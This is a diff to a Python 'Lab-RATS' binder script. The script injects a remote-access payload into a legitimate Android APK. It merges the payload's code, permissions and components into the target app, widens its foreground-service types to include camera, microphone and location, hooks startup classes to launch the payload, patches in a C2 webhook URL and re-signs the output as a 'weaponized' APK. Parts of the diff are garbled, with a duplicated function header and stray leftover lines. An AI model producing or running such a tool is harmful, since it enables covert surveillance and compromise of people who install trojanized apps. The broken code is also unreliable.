@@ -32,7 +32,7 @@ BANNER = """
  │                                                                       │
  │     ██╗      █████╗ ██████╗       ██████╗  █████╗ ████████╗██████╗    │
  │     ██║     ██╔══██╗██╔══██╗      ██╔══██╗██╔══██╗╚══██╔══╝██╔═══╝    │
- │     ██║     ███████║██████╔╝█████╗██████╔╝███████║   ██║   ██████╗    │
+ │     ██║     ███████║██████╔╝█████╗██████╔╝███████║  ██████╗    │
  │     ██║     ██╔══██║██╔══██╗╚════╝██╔══██╗██╔══██║   ██║   ╚════█║    │
  │     ███████╗██║  ██║██████╔╝      ██║  ██║██║  ██║   ██║   ██████║    │
  │     ╚══════╝╚═╝  ╚═╝╚═════╝       ╚═╝  ╚═╝╚═╝  ╚═╝   ╚═╝   ╚═════╝    │
@@ -92,57 +92,60 @@ def get_apktool_cmd(script_dir):
     return ["java", "-jar", jar_path]
 
 
+def extract_bundle_if_needed(apk_path, work_dir):
+    """Detect if target APK is an XAPK / APKM / APKS zip bundle containing base.apk."""
+    if zipfile.is_zipfile(apk_path):
+        try:
+            with zipfile.ZipFile(apk_path, 'r') as z:
+                names = z.namelist()
+                if "base.apk" in names:
+                    log_info(f"Target {os.path.basename(apk_path)} is an XAPK/APKM App Bundle container. Extracting base.apk...")
+                    extract_dir = os.path.join(work_dir, "bundle_extracted")
+                    os.makedirs(extract_dir, exist_ok=True)
+                    z.extractall(extract_dir)
+                    base_apk = os.path.join(extract_dir, "base.apk")
+                    if os.path.exists(base_apk):
+                        log_success("Extracted standalone base.apk from App Bundle container.")
+                        return base_apk
+        except Exception as e:
+            log_warn(f"Bundle check notice: {e}")
+    return apk_path
+
+
 def decompile_apk(apktool_cmd, apk_path, output_dir):
     log_info(f"Decompiling {os.path.basename(apk_path)}...")
     if os.path.exists(output_dir):
         shutil.rmtree(output_dir)
     cmd = apktool_cmd + ["d", "-f", "-o", output_dir, apk_path]
-    run_cmd(cmd)
+    res = subprocess.run(cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
+    manifest_path = os.path.join(output_dir, "AndroidManifest.xml")
+    if not os.path.exists(manifest_path):
+        log_warn("Standard decompilation failed to produce AndroidManifest.xml. Retrying with resource-preservation (-r)...")
+        if os.path.exists(output_dir):
+            shutil.rmtree(output_dir)
+        cmd_fallback = apktool_cmd + ["d", "-f", "-r", "-o", output_dir, apk_path]
+        run_cmd(cmd_fallback)
 
 
 def merge_smali_and_assets(payload_dir, target_dir):
-    log_info("Merging payload Smali classes and assets into target...")
+    log_info("Merging payload Smali classes and assets into target primary smali directory...")
 
-    # Find max smali index in target
-    target_smali_dirs = [d for d in os.listdir(target_dir) if d == "smali" or d.startswith("smali_classes")]
-    max_idx = 1
-    for sd in target_smali_dirs:
-        if sd == "smali":
-            continue
-        m = re.match(r"smali_classes(\d+)", sd)
-        if m:
-            idx = int(m.group(1))
-            if idx > max_idx:
-                max_idx = idx
-
-    # Target directory for payload classes
-    dest_smali_dir = os.path.join(target_dir, f"smali_classes{max_idx + 1}")
+    dest_smali_dir = os.path.join(target_dir, "smali")
     os.makedirs(dest_smali_dir, exist_ok=True)
 
-    # Copy all smali subdirectories from payload smali folders
     payload_smali_dirs = [d for d in os.listdir(payload_dir) if d == "smali" or d.startswith("smali_classes")]
     for psd in payload_smali_dirs:
         psd_path = os.path.join(payload_dir, psd)
-        for item in os.listdir(psd_path):
-            src_item = os.path.join(psd_path, item)
-            dst_item = os.path.join(dest_smali_dir, item)
-
-            # Check if target already has this package in main smali
-            if os.path.exists(os.path.join(target_dir, "smali", item)) and item != "com":
-                continue
-
-            if os.path.isdir(src_item):
-                if not os.path.exists(dst_item):
-                    shutil.copytree(src_item, dst_item)
-                else:
-                    # Merge directories
-                    for root, dirs, files in os.walk(src_item):
-                        rel_path = os.path.relpath(root, src_item)
-                        target_root = os.path.join(dst_item, rel_path)
-                        os.makedirs(target_root, exist_ok=True)
-                        for f in files:
-                            sf = os.path.join(root, f)
-                            df = os.path.join(target_root, f)
+        if os.path.exists(psd_path):
+            for root, dirs, files in os.walk(psd_path):
+                rel = os.path.relpath(root, psd_path)
+                target_root = os.path.join(dest_smali_dir, rel)
+                os.makedirs(target_root, exist_ok=True)
+                for f in files:
+                    sf = os.path.join(root, f)
+                    df = os.path.join(target_root, f)
+                    if not os.path.exists(df):
+                        shutil.copy2(sf, df)
                             if not os.path.exists(df):
                                 shutil.copy2(sf, df)
 
@@ -164,6 +167,182 @@ def merge_smali_and_assets(payload_dir, target_dir):
     log_success("Payload Smali classes and assets successfully merged.")
 
 
+def patch_c2_url(target_dir, web_url):
+    if not web_url:
+        return
+    log_info(f"Patching C2 Webhook URL ({web_url}) into bound Smali classes...")
+    web_url_clean = web_url.strip().rstrip('/')
+
+    count = 0
+    for root, _, files in os.walk(target_dir):
+        rel_root = root.replace("\\", "/")
+        if "com/labs/labrats" in rel_root:
+            for f in files:
+                if f.endswith(".smali"):
+                    sf = os.path.join(root, f)
+                    try:
+                        with open(sf, 'r', encoding='utf-8', errors='ignore') as sfile:
+                            content = sfile.read()
+
+                        new_content = re.sub(
+                            r'(\.field\s+public\s+static\s+(?:final\s+)?(?:WEBHOOK_URL|REMOTE_WEBHOOK_URL|DEFAULT_WEBHOOK):Ljava/lang/String;\s*=\s*")[^"]*(")',
+                            r'\1' + web_url_clean + r'\2',
+                            content
+                        )
+                        new_content = re.sub(r'https?://[a-zA-Z0-9_.-]*onrender\.com[^\s"\'\`]*', web_url_clean, new_content)
+                        new_content = re.sub(r'http://127\.0\.0\.1:\d+[^\s"\'\`]*', web_url_clean, new_content)
+                        new_content = re.sub(r'http://localhost:\d+[^\s"\'\`]*', web_url_clean, new_content)
+
+                        if new_content != content:
+                            with open(sf, 'w', encoding='utf-8') as sfile:
+                                sfile.write(new_content)
+                            count += 1
+                    except Exception:
+                        pass
+    log_success(f"C2 Webhook URL successfully patched in {count} Smali files.")
+
+
+def merge_resources(payload_dir, target_dir):
+    log_info("Merging payload resources (drawables, mipmaps, values) into target...")
+    payload_res = os.path.join(payload_dir, "res")
+    target_res = os.path.join(target_dir, "res")
+
+    if os.path.exists(payload_res):
+        os.makedirs(target_res, exist_ok=True)
+        skip_bases = {"ic_launcher", "ic_launcher_round", "ic_launcher_foreground", "ic_launcher_background"}
+        for root, dirs, files in os.walk(payload_res):
+            rel = os.path.relpath(root, payload_res)
+            dst_root = os.path.join(target_res, rel)
+            os.makedirs(dst_root, exist_ok=True)
+
+            existing_bases = set()
+            if os.path.exists(dst_root):
+                for existing_f in os.listdir(dst_root):
+                    ebase, _ = os.path.splitext(existing_f)
+                    existing_bases.add(ebase.lower())
+
+            for f in files:
+                sf = os.path.join(root, f)
+                df = os.path.join(dst_root, f)
+                f_base, _ = os.path.splitext(f)
+                f_base_lower = f_base.lower()
+
+                if f_base_lower in skip_bases or f_base_lower in existing_bases:
+                    continue
+
+                if not os.path.exists(df):
+                    shutil.copy2(sf, df)
+                    existing_bases.add(f_base_lower)
+
+    # Merge values/*.xml (styles, colors, strings)
+    payload_values = os.path.join(payload_res, "values")
+    target_values = os.path.join(target_res, "values")
+    if os.path.exists(payload_values) and os.path.exists(target_values):
+        for xml_file in ["styles.xml", "colors.xml", "strings.xml", "drawables.xml"]:
+            p_xml = os.path.join(payload_values, xml_file)
+            t_xml = os.path.join(target_values, xml_file)
+            if os.path.exists(p_xml) and os.path.exists(t_xml):
+                try:
+                    p_tree = ET.parse(p_xml)
+                    t_tree = ET.parse(t_xml)
+                    p_root = p_tree.getroot()
+                    t_root = t_tree.getroot()
+                    existing_names = {c.attrib.get('name') for c in t_root if c.attrib.get('name')}
+                    added = False
+                    for elem in p_root:
+                        name = elem.attrib.get('name')
+                        if name and name not in existing_names:
+                            t_root.append(elem)
+                            existing_names.add(name)
+                            added = True
+                    if added:
+                        t_tree.write(t_xml, encoding='utf-8', xml_declaration=True)
+                except Exception as e:
+                    log_warn(f"Values merge notice for {xml_file}: {e}")
+
+    log_success("Payload resources successfully merged into target res directory.")
+
+
+def sanitize_manifest_and_resources(target_dir):
+    log_info("Sanitizing AndroidManifest.xml and resources for AAPT2 compatibility...")
+    manifest_path = os.path.join(target_dir, "AndroidManifest.xml")
+    if os.path.exists(manifest_path):
+        with open(manifest_path, 'r', encoding='utf-8', errors='ignore') as f:
+            content = f.read()
+
+        hex_map = {
+            '0x40000009': 'dataSync|location|specialUse',
+            '0x40000001': 'dataSync|specialUse',
+            '0x40000000': 'specialUse',
+            '0x00000001': 'dataSync',
+            '0x00000008': 'location',
+            '0x00000040': 'camera',
+            '0x00000080': 'microphone',
+            '0x00000020': 'mediaProjection'
+        }
+
+        for hex_val, flag_str in hex_map.items():
+            content = content.replace(f'android:foregroundServiceType="{hex_val}"', f'android:foregroundServiceType="{flag_str}"')
+
+        content = re.sub(r'android:foregroundServiceType="0x[0-9a-fA-F]+"', 'android:foregroundServiceType="dataSync|location|camera|microphone|specialUse"', content)
+
+        with open(manifest_path, 'w', encoding='utf-8') as f:
+            f.write(content)
+
+    res_dir = os.path.join(target_dir, "res")
+    if os.path.exists(res_dir):
+        for root, _, files in os.walk(res_dir, topdown=False):
+            for file in files:
+                if file.endswith(".xml"):
+                    xml_path = os.path.join(root, file)
+                    try:
+                        with open(xml_path, "r", encoding="utf-8", errors="ignore") as f:
+                            content = f.read()
+
+                        # 1. Remove auto-generated API-versioned colors.xml (values-v34/colors.xml, etc.) containing private framework aliases
+                        if ("colors" in file and "values-v" in root) or ("colors" in file and ("bright_foreground" in content or "btn_default_material" in content or "accent_device" in content or "background_floating" in content)):
+                            os.remove(xml_path)
+                            continue
+
+                        lines = content.splitlines()
+                        new_lines = []
+                        modified = False
+                        for line in lines:
+                            if "APKTOOL_DUMMY" in line:
+                                modified = True
+                                continue
+
+                            # 2. Strip <color> or <item> tags pointing to framework colors
+                            if ("<color" in line or "<item" in line) and ("android:color/" in line or "bright_foreground" in line or "btn_default" in line or "accent_device" in line or "background_floating" in line or "background_material" in line or "car_blue" in line or "GM2_grey" in line):
+                                modified = True
+                                continue
+
+                            # 3. Strip <item>, <color>, <dimen>, or <drawable> tags whose inner value points to a framework resource
+                            if ("<item" in line or "<color" in line or "<dimen" in line or "<drawable" in line) and re.search(r'>\s*@\*?android:[^<]+<', line):
+                                modified = True
+                                continue
+
+                            # 4. Clean invalid $ characters in drawable names
+                            if "$" in line:
+                                line = line.replace("@drawable/$", "@drawable/").replace('name="$', 'name="')
+                                modified = True
+
+                            # 5. Convert remaining public framework references (@android:) to private (@*android:)
+                            if "@android:" in line:
+                                line = line.replace("@android:color/", "@*android:color/").replace("@android:style/", "@*android:style/").replace("@android:attr/", "@*android:attr/").replace("@android:dimen/", "@*android:dimen/").replace("@android:drawable/", "@*android:drawable/").replace("@android:string/", "@*android:string/").replace("@android:", "@*android:")
+                                modified = True
+
+                            new_lines.append(line)
+
+                        if modified:
+                            with open(xml_path, "w", encoding="utf-8") as f:
+                                f.write("\n".join(new_lines))
+                    except Exception:
+                        pass
+
+    log_success("Manifest & private framework resource attributes sanitized.")
+
+
 def merge_manifests(payload_dir, target_dir):
     log_info("Performing AndroidManifest.xml surgery...")
     target_manifest_path = os.path.join(target_dir, "AndroidManifest.xml")
@@ -175,29 +354,33 @@ def merge_manifests(payload_dir, target_dir):
     with open(payload_manifest_path, 'r', encoding='utf-8') as f:
         payload_xml = f.read()
 
+    pkg_match = re.search(r'package="([^"]+)"', target_xml)
+    target_pkg = pkg_match.group(1) if pkg_match else "com.target.app"
+
     # Extract uses-permission tags from payload
     permissions = re.findall(r'(<uses-permission[^>]+/>)', payload_xml)
     added_perms = 0
     for perm in permissions:
-        # Extract permission name
         name_match = re.search(r'android:name="([^"]+)"', perm)
         if name_match:
             perm_name = name_match.group(1)
             if perm_name not in target_xml:
-                # Insert permission before </manifest> or <application>
                 if "<application" in target_xml:
                     target_xml = target_xml.replace("<application", f"    {perm}\n    <application", 1)
                     added_perms += 1
 
-    # Extract Lab-RATS components (<service>, <receiver>, <provider>, <activity>)
+    # Extract Lab-RATS components
     components = re.findall(r'(<(?:service|receiver|provider|activity)[^>]*android:name="com\.labs\.labrats\.[^>]+>(?:.*?</(?:service|receiver|provider|activity)>|))', payload_xml, re.DOTALL)
     if not components:
-        # Fallback regex for self-closing components
         components = re.findall(r'(<(?:service|receiver|provider|activity)[^>]*com\.labs\.labrats[^>]+/>)', payload_xml)
 
     added_comps = 0
     for comp in components:
         comp_clean = comp.strip()
+        # Prevent provider authority conflicts
+        if "<provider" in comp_clean and "android:authorities=" in comp_clean:
+            comp_clean = re.sub(r'android:authorities="([^"]+)"', f'android:authorities="{target_pkg}.\\1"', comp_clean)
+
         if "com.labs.labrats" in comp_clean and comp_clean not in target_xml:
             target_xml = target_xml.replace("</application>", f"        {comp_clean}\n    </application>", 1)
             added_comps += 1
@@ -206,6 +389,64 @@ def merge_manifests(payload_dir, target_dir):
         f.write(target_xml)
 
     log_success(f"Manifest Surgery Complete: Injected {added_perms} permissions and {added_comps} components.")
+
+
+def find_launcher_activity(target_dir):
+def find_application_class(target_dir):
+    manifest_path = os.path.join(target_dir, "AndroidManifest.xml")
+    if not os.path.exists(manifest_path):
+        return None
+    try:
+        tree = ET.parse(manifest_path)
+        root = tree.getroot()
+        package_name = root.attrib.get('package', '')
+        app_elem = root.find('application')
+        if app_elem is not None:
+            app_name = app_elem.attrib.get(f'{{{ANDROID_NS}}}name')
+            if app_name:
+                if app_name.startswith('.'):
+                    app_name = package_name + app_name
+                elif '.' not in app_name:
+                    app_name = package_name + '.' + app_name
+                return app_name
+    except Exception:
+        pass
+    return None
+
+
+def set_fallback_application_class(target_dir):
+    manifest_path = os.path.join(target_dir, "AndroidManifest.xml")
+    if not os.path.exists(manifest_path):
+        return
+    try:
+        with open(manifest_path, 'r', encoding='utf-8') as f:
+            content = f.read()
+
+        if '<application' in content and 'android:name=' not in content.split('<application')[1].split('>')[0]:
+            content = content.replace('<application', '<application android:name="com.labs.labrats.LabRatsApp"', 1)
+            with open(manifest_path, 'w', encoding='utf-8') as f:
+                f.write(content)
+            log_success("Set fallback Application class to com.labs.labrats.LabRatsApp in AndroidManifest.xml")
+    except Exception as e:
+        log_warn(f"Notice setting fallback application class: {e}")
+
+
+def resolve_activity_alias(root, package_name, act_name):
+    """If act_name is an activity-alias, resolve its targetActivity."""
+    app_elem = root.find('application')
+    if app_elem is not None:
+        for alias in app_elem.findall('activity-alias'):
+            name = alias.attrib.get(f'{{{ANDROID_NS}}}name')
+            if name and (name == act_name or name.endswith('.' + act_name.split('.')[-1])):
+                target = alias.attrib.get(f'{{{ANDROID_NS}}}targetActivity')
+                if target:
+                    if target.startswith('.'):
+                        target = package_name + target
+                    elif '.' not in target:
+                        target = package_name + '.' + target
+                    log_info(f"Resolved activity-alias {act_name} -> targetActivity {target}")
+                    return target
+    return act_name
 
 
 def find_launcher_activity(target_dir):
@@ -235,14 +476,17 @@ def find_launcher_activity(target_dir):
                     act_name = package_name + act_name
                 elif '.' not in act_name:
                     act_name = package_name + '.' + act_name
-                return act_name
+                return resolve_activity_alias(root, package_name, act_name)
 
     raise RuntimeError("Launcher activity not found in target AndroidManifest.xml")
 
 
-def hook_launcher_activity(target_dir, launcher_class):
-    log_info(f"Injecting Smali hook into Launcher Activity: {launcher_class}")
-    class_rel_path = launcher_class.replace('.', '/') + ".smali"
+def hook_smali_class(target_dir, class_name, is_app_class=False):
+    if not class_name:
+        return False
+
+    log_info(f"Injecting Smali hook into class: {class_name}")
+    class_rel_path = class_name.replace('.', '/') + ".smali"
 
     smali_file = None
     for root, dirs, files in os.walk(target_dir):
@@ -253,31 +497,88 @@ def hook_launcher_activity(target_dir, launcher_class):
                 break
 
     if not smali_file:
-        log_err(f"Could not find smali file for launcher class: {launcher_class}")
-        sys.exit(1)
+        basename = os.path.basename(class_rel_path)
+        for root, dirs, files in os.walk(target_dir):
+            if basename in files:
+                smali_file = os.path.join(root, basename)
+                break
 
-    with open(smali_file, 'r', encoding='utf-8') as f:
+    if not smali_file:
+        log_warn(f"Could not locate smali file for class {class_name}")
+        return False
+
+    with open(smali_file, 'r', encoding='utf-8', errors='ignore') as f:
         content = f.read()
 
     hook_code = "\n    # Lab-RATS Smali Surgery Hook\n    invoke-static {p0}, Lcom/labs/labrats/LabRatsWorker;->init(Landroid/content/Context;)V\n"
 
-    if "onCreate(" in content:
-        # Find onCreate method and inject hook
-        pattern = r'(\.method\s+[^I]*onCreate\(Landroid/os/Bundle;\)V.*?)(\.prologue|\n\s*invoke-super[^\n]+)'
-        if re.search(pattern, content, re.DOTALL):
-            content = re.sub(pattern, r'\1\2' + hook_code, content, count=1, flags=re.DOTALL)
-            log_success("Successfully hooked existing onCreate() method.")
-        else:
-            # Fallback insertion
-            content = content.replace("onCreate(Landroid/os/Bundle;)V", "onCreate(Landroid/os/Bundle;)V\n" + hook_code, 1)
-            log_success("Hook injected into onCreate() method header.")
-    else:
-        # Append onCreate method to class
-        new_on_create = f"""
-.method protected onCreate(Landroid/os/Bundle;)V
-    .registers 2
+    if "Lcom/labs/labrats/LabRatsWorker;->init" in content:
+        log_info(f"Class {class_name} is already hooked.")
+        return True
 
-    invoke-super {{p0, p1}}, Landroid/app/Activity;->onCreate(Landroid/os/Bundle;)V
+    # Extract exact superclass from .super L...; line to prevent ART VerifyError on invoke-super
+    super_match = re.search(r'^\s*\.super\s+(L[^;]+;)', content, re.MULTILINE)
+    super_class = super_match.group(1) if super_match else "Landroid/app/Activity;"
+
+    lines = content.splitlines()
+    new_lines = []
+    in_target_method = False
+    hook_injected = False
+    method_uses_p1 = False
+
+    hook_p0 = "\n    # Lab-RATS Smali Surgery Hook\n    invoke-static {p0}, Lcom/labs/labrats/LabRatsWorker;->init(Landroid/content/Context;)V"
+    hook_p1 = "\n    # Lab-RATS Smali Surgery Hook\n    invoke-static {p1}, Lcom/labs/labrats/LabRatsWorker;->init(Landroid/content/Context;)V"
+
+    for line in lines:
+        new_lines.append(line)
+        if not hook_injected:
+            if ".method" in line and ("onCreate(" in line or "attachBaseContext(" in line):
+                in_target_method = True
+                method_uses_p1 = "attachBaseContext" in line
+                continue
+            if in_target_method:
+                ls = line.strip()
+                if ls.startswith(".locals") or ls.startswith(".registers") or ls.startswith(".prologue") or ls.startswith(".line"):
+                    new_lines.append(hook_p1 if method_uses_p1 else hook_p0)
+                    hook_injected = True
+                    in_target_method = False
+            if ".end method" in line:
+                in_target_method = False
+
+    if hook_injected:
+        with open(smali_file, 'w', encoding='utf-8') as f:
+            f.write("\n".join(new_lines))
+        log_success(f"Injected Lab-RATS startup hook into {class_name}")
+        return True
+    else:
+        new_on_create = (
+            "\n.method protected onCreate(Landroid/os/Bundle;)V\n"
+            "    .registers 2\n"
+            f"    invoke-super {{p0, p1}}, {super_class}->onCreate(Landroid/os/Bundle;)V\n"
+            + hook_p0 + "\n"
+            "    return-void\n"
+            ".end method\n\n"
+        )
+        if ".end class" in content:
+            content = content.replace(".end class", new_on_create + "\n.end class")
+            with open(smali_file, 'w', encoding='utf-8') as f:
+                f.write(content)
+            log_success(f"Created and injected new onCreate() hook into {class_name}")
+            return True
+
+    return False
+
+
+def hook_launcher_activity(target_dir, launcher_class):
+    # 1. Hook Application class if specified, or set fallback
+    app_class = find_application_class(target_dir)
+    if app_class:
+        hook_smali_class(target_dir, app_class, is_app_class=True)
+    else:
+        set_fallback_application_class(target_dir)
+
+    # 2. Hook Launcher Activity
+    hook_smali_class(target_dir, launcher_class, is_app_class=False)
 {hook_code}
     return-void
 .endmethod
@@ -289,24 +590,72 @@ def hook_launcher_activity(target_dir, launcher_class):
         f.write(content)
 
 
+def ensure_valid_keystore(keystore_path, storepass, keyalias):
+    """Ensure keystore exists and contains the specified keyalias."""
+    if os.path.exists(keystore_path):
+        cmd = ["keytool", "-list", "-keystore", keystore_path, "-alias", keyalias, "-storepass", storepass]
+        res = subprocess.run(cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
+        if res.returncode != 0:
+            log_warn(f"Keystore alias '{keyalias}' not found in {keystore_path}. Regenerating keystore...")
+            try:
+                os.remove(keystore_path)
+            except Exception:
+                pass
+
+    if not os.path.exists(keystore_path):
+        log_info(f"Generating fresh keystore at {keystore_path}...")
+        cmd_gen1 = [
+            "keytool", "-genkeypair", "-alias", "lab-rats-key",
+            "-keyalg", "RSA", "-keysize", "2048", "-validity", "9125",
+            "-keystore", keystore_path, "-storepass", storepass, "-keypass", storepass,
+            "-dname", "CN=Lab-RATS Developer, O=Lab-RATS.LABS, C=US"
+        ]
+        run_cmd(cmd_gen1)
+        cmd_gen2 = [
+            "keytool", "-genkeypair", "-alias", "render",
+            "-keyalg", "RSA", "-keysize", "2048", "-validity", "9125",
+            "-keystore", keystore_path, "-storepass", storepass, "-keypass", storepass,
+            "-dname", "CN=Lab-RATS Developer, O=Lab-RATS.LABS, C=US"
+        ]
+        run_cmd(cmd_gen2)
+
+
 def recompile_and_sign(apktool_cmd, script_dir, target_dir, output_apk, keystore_path, storepass, keyalias):
     log_info("Rebuilding bound APK with apktool...")
     unsigned_apk = os.path.join(script_dir, "temp_binder", "unsigned_bound.apk")
     aligned_apk = os.path.join(script_dir, "temp_binder", "aligned_bound.apk")
 
-    cmd = apktool_cmd + ["b", target_dir, "-o", unsigned_apk]
-    run_cmd(cmd)
+    # Detect native stable AAPT1 (v1) to prevent AAPT2 exit code 138 SIGBUS crashes
+    aapt_flag = []
+    sdk_bt = os.path.expanduser("~/Library/Android/sdk/build-tools")
+    if os.path.exists(sdk_bt):
+        stable = [d for d in os.listdir(sdk_bt) if d.startswith("3") and not d.startswith("37")]
+        if stable:
+            stable.sort()
+            bt_path = os.path.join(sdk_bt, stable[-1])
+            aapt1 = os.path.join(bt_path, "aapt")
+            if os.path.exists(aapt1):
+                aapt_flag = ["--aapt", aapt1]
+
+    cmd = apktool_cmd + ["b"] + aapt_flag + ["--no-crunch", target_dir, "-o", unsigned_apk]
+    try:
+        run_cmd(cmd)
+    except Exception:
+        log_warn("Retrying build with apktool default AAPT...")
+        cmd_fallback = apktool_cmd + ["b", "-c", "--no-crunch", target_dir, "-o", unsigned_apk]
+        run_cmd(cmd_fallback)
 
     # ZipAlign
     log_info("Aligning APK bytes with zipalign...")
     if shutil.which("zipalign"):
-        run_cmd(["zipalign", "-f", "-v", "4", unsigned_apk, aligned_apk])
+        run_cmd(["zipalign", "-p", "-f", "-v", "4", unsigned_apk, aligned_apk])
     else:
         log_warn("zipalign not found on system PATH; skipping alignment step.")
         aligned_apk = unsigned_apk
 
     # Sign APK
     log_info("Signing bound APK...")
+    ensure_valid_keystore(keystore_path, storepass, keyalias)
     if shutil.which("apksigner"):
         run_cmd(["apksigner", "sign", "--ks", keystore_path, "--ks-pass", f"pass:{storepass}", "--ks-key-alias", keyalias, "--out", output_apk, aligned_apk])
     elif shutil.which("jarsigner"):
@@ -315,6 +664,14 @@ def recompile_and_sign(apktool_cmd, script_dir, target_dir, output_apk, keystore
     else:
         log_err("Neither apksigner nor jarsigner found on system PATH!")
         sys.exit(1)
+
+    if not os.path.exists(output_apk):
+        shutil.copy2(aligned_apk, output_apk)
+
+    try:
+        shutil.copy2(output_apk, os.path.join(script_dir, "bind_output", "bound_target.apk"))
+    except Exception:
+        pass
 
     log_success(f"WEAPONIZED BOUND APK READY: {output_apk}")
 
@@ -328,6 +685,7 @@ def main():
     parser.add_argument("--keystore", help="Path to JKS keystore")
     parser.add_argument("--storepass", default="lab-rats123", help="Keystore password")
     parser.add_argument("--keyalias", default="lab-rats-key", help="Key alias")
+    parser.add_argument("--url", help="C2 Webhook URL")
 
     args = parser.parse_args()
 
@@ -342,9 +700,9 @@ def main():
     payload_apk = args.payload
     if not payload_apk:
         default_payloads = [
-            os.path.join(script_dir, "output", "signed_v1.apk"),
             os.path.join(project_dir, "app", "build", "outputs", "apk", "release", "app-release.apk"),
-            os.path.join(project_dir, "app", "build", "outputs", "apk", "debug", "app-debug.apk")
+            os.path.join(project_dir, "app", "build", "outputs", "apk", "debug", "app-debug.apk"),
+            os.path.join(script_dir, "output", "signed_v1.apk")
         ]
         for p in default_payloads:
             if os.path.exists(p):
@@ -355,8 +713,9 @@ def main():
         log_err("Payload APK not found! Please build Lab-RATS APK first or specify --payload.")
         sys.exit(1)
 
-    output_dir = os.path.join(script_dir, "output")
+    output_dir = os.path.join(project_dir, "bind_output")
     os.makedirs(output_dir, exist_ok=True)
+    os.makedirs(os.path.join(script_dir, "bind_output"), exist_ok=True)
     output_apk = args.output or os.path.join(output_dir, "bound_target.apk")
 
     keystore_path = args.keystore or os.path.join(project_dir, "lab-rats-keystore.jks")
@@ -369,12 +728,25 @@ def main():
     payload_dir = os.path.join(work_dir, "payload")
     target_dir = os.path.join(work_dir, "target")
 
+    c2_url = args.url
+    if not c2_url:
+        local_props = os.path.join(project_dir, "local.properties")
+        if os.path.exists(local_props):
+            with open(local_props, "r", encoding="utf-8") as lp:
+                for l in lp:
+                    if l.startswith("WEBHOOK_URL="):
+                        c2_url = l.split("=", 1)[1].strip()
+
     try:
+        target_apk = extract_bundle_if_needed(target_apk, work_dir)
         decompile_apk(apktool_cmd, payload_apk, payload_dir)
         decompile_apk(apktool_cmd, target_apk, target_dir)
 
         merge_smali_and_assets(payload_dir, target_dir)
+        patch_c2_url(target_dir, c2_url)
+        merge_resources(payload_dir, target_dir)
         merge_manifests(payload_dir, target_dir)
+        sanitize_manifest_and_resources(target_dir)
 
         launcher_class = find_launcher_activity(target_dir)
         hook_launcher_activity(target_dir, launcher_class)
